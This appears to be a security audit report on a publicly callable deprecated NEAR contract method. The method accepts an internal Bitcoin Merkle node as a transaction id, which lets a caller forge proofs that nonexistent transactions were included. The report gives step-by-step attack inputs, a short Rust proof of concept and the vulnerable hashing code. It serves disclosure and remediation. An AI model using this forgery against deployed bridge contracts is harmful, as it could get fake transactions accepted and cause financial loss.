### Title
Deprecated `verify_transaction_inclusion` Accepts Internal Merkle Node as `tx_id`, Returning `true` for Non-Existent Transactions — (`contract/src/lib.rs`, `merkle-tools/src/lib.rs`)

---

### Summary

The public NEAR contract method `verify_transaction_inclusion` (v1) is still callable by any external account despite being deprecated. It passes the caller-supplied `tx_id` directly into `compute_root_from_merkle_proof` with no distinction between leaf nodes and internal nodes. An attacker who knows any internal node hash in a block's Merkle tree can construct a shortened proof that routes through that internal node and causes the function to return `true` for a transaction that does not exist.

---

### Finding Description

`verify_transaction_inclusion` is marked `#[deprecated]` and carries an explicit warning, but it is **not** `#[private]` and carries no access-control gate — only `#[pause]`, which is an admin-controlled toggle that is active by default. [1](#0-0) 

The function delegates directly to `compute_root_from_merkle_proof`: [2](#0-1) 

`compute_root_from_merkle_proof` treats `transaction_hash` as an opaque 32-byte value and hashes it with each sibling in the proof path using `double_sha256` on the raw 64-byte concatenation, with no domain separation between leaf and internal nodes: [3](#0-2) 

Because Bitcoin's Merkle tree uses the same hash function at every level, any internal node hash `N = double_sha256(left || right)` is indistinguishable from a leaf hash at the `compute_root_from_merkle_proof` level.

---

### Impact Explanation

For a 4-transaction block with leaves `tx0, tx1, tx2, tx3`:

```
N01  = double_sha256(tx0 || tx1)   ← internal node
N23  = double_sha256(tx2 || tx3)   ← internal node
Root = double_sha256(N01 || N23)
```

An attacker calls `verify_transaction_inclusion` with:
- `tx_id     = N01`  (an internal node, not a real transaction)
- `tx_index  = 0`
- `merkle_proof = [N23]`  (one element, the sibling internal node)

`compute_root_from_merkle_proof(N01, 0, [N23])` computes `double_sha256(N01 || N23) = Root`, which equals `header.block_header.merkle_root`, so the function returns `true` — falsely asserting that `N01` is an included transaction.

The attacker needs only to observe a real confirmed block (all internal node hashes are computable from public transaction data) and submit a NEAR view or change call to the contract. No privileged role, leaked key, or social engineering is required.

---

### Likelihood Explanation

- The v1 method is publicly callable on mainnet today (not removed, not access-gated).
- All inputs needed for the attack (block hash, transaction hashes, internal node values) are publicly available from any Bitcoin block explorer.
- The attack is the well-documented CVE-2017-12842 / [64-byte transaction forgery](https://www.bitmex.com/blog/64-Byte-Transactions), which the codebase itself references in the deprecation notice.
- The code's own warning at line 278 confirms the broken invariant: [4](#0-3) 

---

### Recommendation

1. **Remove `verify_transaction_inclusion` (v1) entirely** from the contract, or gate it with `#[private]` so it is not externally callable. Deprecation alone does not prevent external callers.
2. Ensure all callers migrate to `verify_transaction_inclusion_v2`, which requires a matching coinbase proof and constrains the tree depth, mitigating the internal-node substitution attack. [5](#0-4) 

---

### Proof of Concept

```rust
// 4-transaction tree
let tx0 = double_sha256(b"tx0");
let tx1 = double_sha256(b"tx1");
let tx2 = double_sha256(b"tx2");
let tx3 = double_sha256(b"tx3");

// Compute internal nodes (all public from block data)
let n01 = compute_hash(&tx0, &tx1);  // internal node, NOT a real tx
let n23 = compute_hash(&tx2, &tx3);
let root = compute_hash(&n01, &n23);

// Forge: supply internal node n01 as tx_id with a 1-element proof [n23]
let forged_root = compute_root_from_merkle_proof(n01.clone(), 0, &vec![n23]);
assert_eq!(forged_root, root);
// verify_transaction_inclusion returns true for n01, which is NOT a transaction
```

This is locally testable against `merkle-tools/src/lib.rs` with no modifications to the repository. [6](#0-5)

#[must_use]
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}

fn compute_hash(first_tx_hash: &H256, second_tx_hash: &H256) -> H256 {
    let mut concat_inputs = Vec::with_capacity(64);
    concat_inputs.extend(first_tx_hash.0);
    concat_inputs.extend(second_tx_hash.0);

    double_sha256(&concat_inputs)
}
